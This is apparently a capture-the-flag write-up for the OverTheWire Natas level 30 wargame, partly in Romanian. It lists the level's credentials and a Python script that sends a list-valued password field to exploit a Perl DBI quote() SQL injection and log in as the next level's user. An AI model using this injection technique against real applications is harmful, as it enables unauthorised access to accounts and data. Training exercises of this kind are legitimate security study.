
# General info

Username: natas30

Password: WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH

URL:      http://natas30.natas.labs.overthewire.org

# Special code section

```py
import requests

response = requests.post(
    url="http://natas30.natas.labs.overthewire.org/index.pl",
    auth=("natas30", "WQhx1BvcmP9irs2MP9tRnLsNaDI76YrH"),
    data={
        "username" : "natas31",
        "password" : [
            "'lol' or 1",
            4
        ]
    }
)

print(response.text)
```

Aici m-am prins ca e vorba de un SQL injection.
Totusi, nu am inteles inca de ce e nevoie de `'lol' or 1` in loc de un `' OR 1=1 --`.
Ideea a venit dupa ce am citit [acest post de pe StackOverflow](https://security.stackexchange.com/questions/175703/is-this-perl-database-connection-vulnerable-to-sql-injection/175872#175872) si [acest post](https://stackoverflow.com/questions/40273267/is-perl-function-dbh-quote-still-secure).